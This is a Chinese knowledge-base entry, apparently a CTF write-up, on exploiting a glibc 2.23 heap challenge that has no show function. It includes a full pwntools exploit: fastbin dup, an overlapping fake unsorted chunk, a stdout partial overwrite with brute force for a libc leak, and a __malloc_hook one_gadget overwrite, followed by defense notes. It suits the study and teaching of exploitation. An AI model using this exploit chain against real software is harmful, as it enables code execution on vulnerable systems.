---
id: binary-pwn-heap-no-show-fastbin-unsorted-overlap-stdout-bruteforce-malloc-hook
title: 无 show 且只能申请 fastbin 大小：伪造 0xd1 unsorted 块与 fastbin 块重叠把 main_arena 指针写进 fd，部分覆写 stdout 泄露后再打 __malloc_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: no-show-fastbin-overlap-unsorted-pointer-stdout-partial-overwrite-bruteforce-malloc-hook
affected_versions: glibc 2.23
aliases:
- de1ctf_2019_weapon
- 无 show fastbin 堆题
- fastbin 重叠 unsorted 块
- main_arena 写进 fastbin fd
- stdout-0x43 爆破
- 1/16 爆破 stdout
- fastbin dup 打 malloc_hook
tags:
- pwn
- heap
- glibc-2.23
- no-show
- fastbin-dup
- unsorted-bin
- overlapping-chunk
- stdout
- partial-overwrite
- bruteforce
- malloc-hook
- one-gadget
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V298
  verified_at: '2026-11-08T08:06:55+08:00'
  notes: 已对照原文637行与36张图核对：无show、add≤0x60、UAF、fastbin dup、chunk1伪造0x6f、size=0xd1假unsorted块、free(2)/free(3)重叠、切分后fastbin 0x70 fd=0x7ffff7bc4b61（图33/34）、stdout-0x43伪块与低2字节55dd 1/16爆破（图35）、0xfbad1800+清零读指针、__malloc_hook one_gadget[2]=0xf02a4、free(0);free(0) 收尾均与原文exp一致。affected_versions=glibc 2.23 与原文（本地2.23/原题2.31）一致。dup-scan related pair（topchunk exhaustion/House of Roman/House of Rabbit）机制不同，判并列保留。未在本机复跑exp。
---

## 一句话结论

在没有 show、add 只允许 ≤0x60（fastbin 范围）的 glibc 2.23 堆题里，可以先用 fastbin dup 拿到一块位于其它堆块数据区的“伪造块”，写入 size=0xd1 并 free 进 unsorted bin；这个假 unsorted 块与一个真实 fastbin 块重叠，后续 malloc 切分它时会把 unsorted bin 头的 `main_arena+0x58` 指针写到重叠 fastbin 块的 fd 位置，于是在没有任何泄露的情况下得到一个 libc 指针。再对 fd 做 2 字节部分覆写，让下一次 fastbin 分配返回 `_IO_2_1_stdout_-0x43` 的伪块（该处 size 字节恰好合法，需 1/16 爆破），写入 `0xfbad1800` 与清零的读指针触发 stdout 越界输出泄露 libc，最后 fastbin dup 把 `__malloc_hook` 改成 one_gadget。

## 原理

- **为什么需要伪造 unsorted 块**：size 上限 0x60 时，正常 free 只能进 fastbin，无法直接获得 unsorted bin 的 libc 指针。fastbin dup 可以重复分配同一块，借自己的数据区伪造一个更大的 chunk 头（size=0xd1），free 这个“假块”就把它挂进 unsorted bin。
- **重叠是怎么形成的**：假 unsorted 块从某个真实块的数据区开始，长度 0xd0，覆盖了后面一个真实 fastbin 块；free 假块后，unsorted bin 在假块的 `fd`/`bk` 写入 `main_arena+0x58`。随后 malloc 切分这个 unsorted 块时，remainder 的 `fd`/`bk` 会被写成 unsorted bin 头地址，而 remainder 的位置正好与那个 fastbin 块重叠，指针就落到 fastbin 块的 fd/用户数据上。原文 gdb 中 fastbin 0x70 的 fd 变为 `0x7ffff7bc4b61` 这样的 libc 地址。
- **无泄露也能定位 stdout**：libc 映射页对齐，任何 libc 地址的低 12 位固定；`main_arena+0x58` 与 `_IO_2_1_stdout_-0x43` 高位相同，仅低 2 字节不同。把 fastbin fd 的低 2 字节从 `0x4b61` 改成 `0x55dd`，只有 bit12 所在的 nibble（示例中的 `4`→`5`）受 ASLR 随机化影响，所以是约 1/16 的爆破，失败重连即可。
- **为什么选 stdout-0x43**：fastbin 分配会检查目标伪块的 size 字段；`_IO_2_1_stdout_-0x43` 作为 chunk 头时，其 size 位置上的库数据恰好可以被解释为合法的 0x7f 类 fastbin size（原文 "由于 size 检查的原因，只能申请到 stdout 上面 0x43 的位置"）。伪块用户区为 `stdout-0x33`，写入 0x33 字节填充后正好覆盖 stdout 的 `_flags`。
- **stdout 泄露**：把 `_flags` 设为 `0xfbad1800`、`_IO_read_ptr/_read_end/_read_base` 清零、`_IO_write_base` 最低字节改成 0x00，使 `[write_base, write_ptr)` 覆盖 stdout 前方的 libc 数据；下一次 `puts`/`printf`/退出 flush 就把这段数据打印出来，窗口内包含稳定的 libc 指针（示例减 0x3c5600 得 libc base）。
- **收尾**：拿到 libc 后走标准 fastbin dup：`free(13); free(14); free(13)` 形成重复块，改 fd 到 `__malloc_hook-0x23`，分配后在 hook 写入 one_gadget，触发 malloc 执行。

## 触发条件

- glibc 2.23（保留 `__malloc_hook`，fastbin 无 tcache/更严格的检查）。
- add 限制大小在 fastbin 范围（如 ≤0x60），且 delete 不置空形成 UAF，edit 按记录的 size 写入（可编辑已释放块）。
- 程序没有 show 或无法直接读取已释放块；需要靠 stdout 泄露 libc。
- 能构造并接受 1/16 量级的爆破重试（ASLR 每次进程不同）。
- 目标 libc 已知（用于 `_IO_2_1_stdout_`、`main_arena`、`__malloc_hook` 与 one_gadget 偏移）；堆布局需稳定，使伪块与 fastbin 块的重叠位置可预测。

## 利用步骤

1. 按 0x50/0x60 申请 6 个块（示例：0x50,0x50,0x50,0x60,0x50,0x60），并在 chunk1 用户区末尾写 `b'a'*0x40+p64(0)+p64(0x6f)`，把相邻块 size 改成 0x6f，为后续 fastbin dup 链制造落点。
2. `free(0); free(1); free(0)` 形成 fastbin dup；`add(0x50,0,'\xb0')` 改写 fastbin fd 低字节，使链经过 0x...b0 处的伪造落点；连续分配把该落点申请出来，`add(0x50,7,p64(0)+p64(0xd1))` 在目标块头写入 size=0xd1。
3. `free(2)` 把 size=0xd1 的假块挂入 unsorted bin（fd/bk=main_arena+0x58）；`free(3)` 释放被假块覆盖的真实 fastbin 块，形成 unsorted 与 fastbin 的重叠。
4. 申请若干 0x50 块切分 unsorted 块：第一块分割、第二块把 unsorted 块取出、第三块取出 fastbin 块；切分过程把 main_arena 指针写进重叠 fastbin 块的 fd（原文 gdb：fd=0x7ffff7bc4b61）。
5. 再次 fastbin dup（示例 `free(2); free(4); free(2)`），用 edit/分配写入把 fastbin fd 的低 2 字节改成 `stdout-0x43` 的低 2 字节（示例 `0x55dd`）；若爆破失败则重连。
6. 申请到 `stdout-0x43` 的伪块（用户区 `stdout-0x33`），写入 `b'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + b'\x00'`，覆盖 stdout 头部。
7. 下一次输出/刷新时读取泄露数据，`libc_base = leak - 0x3c5600`（偏移按目标 libc 调整）。
8. 计算 `__malloc_hook` 与 one_gadget；再次 `free(13); free(14); free(13)` 做 fastbin dup，改 fd 到 `__malloc_hook-0x23`，分配后写入 `b'a'*0x13+p64(one_gadget)`，触发一次 malloc 执行 one_gadget。

## PoC

原文 exp 的关键骨架（glibc 2.23，ASLR 需爆破，未在本机复跑）：

```python
from pwn import *
libc = ELF('./libc-2.23.so')

# 1) 堆风水：伪造 0x6f size + fastbin dup 落点
add(0x50, 0, 'aaaa')
add(0x50, 1, b'a'*0x40 + p64(0) + p64(0x6f))
add(0x50, 2, 'aaaa')
add(0x60, 3, 'aaaa')
add(0x50, 4, 'aaaa')
add(0x60, 5, 'aaaa')

free(0); free(1); free(0)
add(0x50, 0, '\xb0')
add(0x50, 1, 'aaaa')
add(0x50, 0, 'aaaa')
add(0x50, 7, p64(0) + p64(0xd1))     # 伪造 size=0xd1

# 2) unsorted 块与 fastbin 块重叠，切分后 main_arena 指针进入 fastbin fd
free(2); free(3)
add(0x50, 8, 'a'); add(0x50, 9, 'a'); add(0x50, 10, 'a')

# 3) 再次 fastbin dup，部分覆写 fd 到 stdout-0x43（低 2 字节 0x55dd，1/16 爆破）
free(2); free(4); free(2)
add(0x50, 2, '\x10')
add(0x50, 4, 'aaaa')
add(0x50, 2, b'a'*0x40 + p64(0) + p64(0x6f))
add(0x50, 11, p64(0) + p64(0x71) + b'\xdd\x25')
add(0x60, 3, 'aaaa')

# 4) 在 stdout 上伪造 FILE 头并泄露
add(0x60, 12, b'a'*0x33 + p64(0xfbad1800) + p64(0)*3 + b'\x00')
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x3c5600
if libc_base == -0x3c5600:
    exit(-1)

# 5) fastbin dup 打 __malloc_hook -> one_gadget
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + [0x45216, 0x4526a, 0xf02a4, 0xf1147][2]
add(0x60, 13, 'a'); add(0x60, 14, 'a'); add(0x60, 15, 'a')
free(13); free(14); free(13)
add(0x60, 13, p64(malloc_hook - 0x23))
add(0x60, 14, 'a')
add(0x60, 13, 'a')
add(0x60, 16, b'a'*0x13 + p64(one_gadget))
free(0); free(0)
io.interactive()
```

调试时在 unsorted 切分后查看 `bins`，确认 fastbin 0x70 的 fd 已是 libc 地址；在 `_IO_new_file_overflow`/`_IO_do_write` 下断确认 stdout 输出窗口。

## 变体与关联

- 变体：已有 libc/heap 泄露时可直接跳过阶段 1-2，用常规 fastbin dup 打 `__malloc_hook`，见 [[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]。
- 变体：stdout 头部只改 `_flags` 与 `_IO_write_base` 低字节即可扩大输出窗口，见 [[binary-pwn-heap-stdout-partial-overwrite-libc-leak]]；本文额外利用“把 main_arena 指针写进 fastbin fd + 1/16 爆破伪块到 stdout 附近”解决无泄露定位问题。
- 变体：若 `__malloc_hook` 不可用（glibc ≥2.34），可把最终目标改为 FILE/FSOP 或其它函数指针。
- 关联：[[binary-pwn-heap-unsorted-bin-global-max-fast-bss-fake-fastbin-free-hook]]（unsorted bin attack 与 fastbin 结构的组合）、[[binary-pwn-heap-tcache-reverse-into-fastbin-fastbin-dup-arbitrary-alloc]]（fastbin 链控制的另一变体）。

## 检测与防御

- **修复根因**：index 与 size 严格校验；delete 后指针置空并标记已释放；edit 不得写入已释放块；add 的 size 上限与记录保持一致。
- **加固**：升级 glibc 到移除 hooks 的版本；开启 tcache key/safe-linking；Full RELRO + PIE + Canary；对 FILE 结构做完整性检查。
- **检测**：fastbin 的 fd 指向 libc 数据段（如 `main_arena`/stdout 附近）；unsorted 块与 fastbin 块地址范围重叠；`_IO_2_1_stdout_` 的 `_flags` 变为 0xfbad1800 或读指针被清零；`__malloc_hook` 出现 one_gadget 值。
- **响应**：出现上述堆/FILE 元数据异常立即终止进程并保留 core，检查是否已被写入 hook 或伪造 FILE，升级 glibc 并修补 UAF。
